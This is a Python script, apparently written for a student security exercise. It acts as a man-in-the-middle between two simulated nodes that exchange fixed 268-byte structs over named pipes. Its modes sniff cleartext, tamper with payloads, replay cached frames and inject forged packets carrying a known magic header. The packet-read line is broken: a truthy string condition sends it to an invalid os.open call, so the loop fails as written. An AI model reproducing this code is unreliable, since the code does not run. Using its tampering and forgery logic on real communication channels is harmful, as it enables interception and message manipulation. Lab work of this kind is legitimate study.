#!/usr/bin/env python3

import os
import sys
import struct
import binascii
import time
import argparse

# Named pipe paths matching your simulation topography
PIPE_IN = "/tmp/nodeA_to_attacker"
PIPE_OUT = "/tmp/attacker_to_nodeB"

# --- PROTOCOL STRUCT SPECIFICATION (UNCHANGED C CONTRACT) ---
# Format: Little-Endian (<) | Header (4B 'I') | Type (1B 'B') | Pad (1B 'x') | Length (2B 'H') | Payload (256B '256s') | Seq (4B 'I')
PACKET_FORMAT = '<IBxH256sI'
PACKET_SIZE = struct.calcsize(PACKET_FORMAT)  # Evaluates to exactly 268 bytes


class MitmOrchestrator:
    def __init__(self, mode, target_str=None, replace_str=None, inject_msg=None):
        self.mode = mode
        self.target_str = target_str
        self.replace_str = replace_str
        self.inject_msg = inject_msg
        self.replay_cache = []  # In-memory storage for capturing valid frames

    def compute_crc32(self, data_bytes):
        """Computes unsigned 32-bit CRC checksum for logging telemetry."""
        return binascii.crc32(data_bytes) & 0xFFFFFFFF

    def run(self):
        """Launches the primary pipeline processing engine."""
        if self.mode == "inject":
            self.execute_standalone_injection()
            return

        print(f"[*] Initializing Active Intercept Layer. Strategy: [{self.mode.upper()}]")
        
        # Verify pipe node readiness
        if not os.path.exists(PIPE_IN) or not os.path.exists(PIPE_OUT):
            print("[-] Infrastructure Error: Named pipes missing.")
            sys.exit(1)

        print("[*] Opening Channel Read Target (Listening to Node A)...")
        fd_in = os.open(PIPE_IN, os.O_RDONLY)
        
        print("[*] Opening Channel Write Target (Forwarding to Node B)...")
        fd_out = os.open(PIPE_OUT, os.O_WRONLY)
        
        print("[+] Proxy routing channels engaged seamlessly.\n")

        while True:
            try:
                # -------------------------------------------------------------
                # FIXED STRUCTURE EXTRACTION (Matches sizeof(Packet) = 268B)
                # -------------------------------------------------------------
                raw_packet = os.open(fd_in, PACKET_SIZE) if 'os.read' else os.read(fd_in, PACKET_SIZE)
                if not raw_packet:
                    print("[*] Stream terminated by Sender. Awaiting reconnection context...")
                    os.close(fd_in)
                    fd_in = os.open(PIPE_IN, os.O_RDONLY)
                    continue

                if len(raw_packet) < PACKET_SIZE:
                    print(f"[-] Received incomplete frame ({len(raw_packet)}/{PACKET_SIZE} bytes). Skipping...")
                    continue

                # Unpack matching native C struct alignment layouts
                magic, packet_type, payload_len, raw_payload, seq = struct.unpack(PACKET_FORMAT, raw_packet)

                # Isolate active cleartext data up to the validated string boundary
                cleartext_payload = raw_payload[:payload_len].decode('utf-8', errors='ignore')
                crc = self.compute_crc32(raw_payload[:payload_len])

                # -------------------------------------------------------------
                # ATTACK CLASS 1: PLAINTEXT SNIFFING LOGGING
                # -------------------------------------------------------------
                print("\033[94m" + "="*60)
                print(f"[INTERCEPTED FRAME] Sequence Index: {seq}")
                print(f"  ├── Magic Identifier : {hex(magic).upper()}")
                print(f"  ├── Packet Type Tag  : {packet_type}")
                print(f"  ├── Captured Data    : \"{cleartext_payload}\" ({payload_len} Bytes)")
                print(f"  └── Computed Telemetry Checksum : {hex(crc).upper()}")
                print("="*60 + "\033[0m")

                # -------------------------------------------------------------
                # ATTACK CLASS 2: REPLAY CACHING MECHANISM
                # -------------------------------------------------------------
                if self.mode == "replay":
                    self.replay_cache.append(raw_packet)
                    print(f"[+] Replay Subsystem: Cached valid 268-byte structural frame.")

                # -------------------------------------------------------------
                # ATTACK CLASS 3: PACKET TAMPERING MOTOR
                # -------------------------------------------------------------
                if self.mode == "tamper" and self.target_str and self.replace_str:
                    if self.target_str in cleartext_payload:
                        print(f"\n\033[91m[!] CRITICAL: Found match for target query token: '{self.target_str}'")
                        
                        # Execute string replacement transformation
                        cleartext_payload = cleartext_payload.replace(self.target_str, self.replace_str)
                        new_payload_bytes = cleartext_payload.encode('utf-8', errors='ignore')
                        payload_len = len(new_payload_bytes)
                        
                        # Pad the byte array with nulls back to exactly 256 bytes for C struct compliance
                        padded_payload = new_payload_bytes.ljust(256, b'\x00')
                        
                        # Pack back into complete 268-byte struct format
                        raw_packet = struct.pack(PACKET_FORMAT, magic, packet_type, payload_len, padded_payload, seq)
                        
                        print(f"  ├── Mutator: Swapped cleartext with string: \"{cleartext_payload}\"")
                        print(f"  └── Structure Pack: Synthesized updated 268-byte frame stream.\033[0m\n")

                # Emit final compliant packet structure down the channel to Node B
                os.write(fd_out, raw_packet)

                # -------------------------------------------------------------
                # ATTACK CLASS 2: REPLAY TIME-DELAY INJECTION RUNNER
                # -------------------------------------------------------------
                if self.mode == "replay" and len(self.replay_cache) > 0:
                    time.sleep(2)  # Delay injection footprint by two seconds
                    print("\n\033[33m[!] REPLAY ATTACK EXECUTION: Re-injecting historical state frame...")
                    os.write(fd_out, self.replay_cache[0])
                    print("    └── [SUCCESS] Duplicate sequence packet pushed to Node B.\033[0m\n")
                    self.replay_cache.clear()

            except KeyboardInterrupt:
                print("\n[*] Intercept routine terminated cleanly.")
                break

        os.close(fd_in)
        os.close(fd_out)

    def execute_standalone_injection(self):
        """ATTACK CLASS 4: FORGED PACKET INJECTION"""
        print(f"[*] Initializing Forged Packet Injection Engine...")
        print(f"[*] Bypassing Node A entirely. Establishing target channel access link...")
        
        try:
            fd_out = os.open(PIPE_OUT, os.O_WRONLY)
            
            # 0xABCD1234 matches MAGIC_HEADER macro definition inside packet.h
            fake_magic = 0xABCD1234  
            fake_type = 1          
            fake_seq = 1337         
            
            new_payload_bytes = self.inject_msg.encode('utf-8', errors='ignore')
            payload_len = len(new_payload_bytes)
            
            # Pad the payload string to the fixed 256-byte constraint
            padded_payload = new_payload_bytes.ljust(256, b'\x00')
            
            # Construct a clean binary equivalent of sizeof(Packet)
            packet = struct.pack(PACKET_FORMAT, fake_magic, fake_type, payload_len, padded_payload, fake_seq)
            
            print("\n\033[95m" + "!"*60)
            print(f"[PACKET FORGERY DISPATCHED] Sending Unauthorized Structural Payload")
            print(f"  ├── Forged Message Body : \"{self.inject_msg}\"")
            print(f"  └── Total Outflow Frame : {len(packet)} Bytes Packed")
            print("!"*60 + "\033[0m\n")
            
            os.write(fd_out, packet)
            os.close(fd_out)
            
        except Exception as e:
            print(f"[-] Critical injection processing crash occurred: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IITI SOC 2026 Track 3 Cyber Engine")
    parser.add_argument('--mode', choices=['sniff', 'tamper', 'replay', 'inject'], required=True)
    parser.add_argument('--target', type=str, help="Target keyword to match during tampering loops.")
    parser.add_argument('--replace', type=str, help="Replacement text to write over target entries.")
    parser.add_argument('--message', type=str, default="HELLO FROM NODE A", help="Data block payload for injection runs.")
    
    args = parser.parse_args()
    engine = MitmOrchestrator(mode=args.mode, target_str=args.target, replace_str=args.replace, inject_msg=args.message)
    engine.run()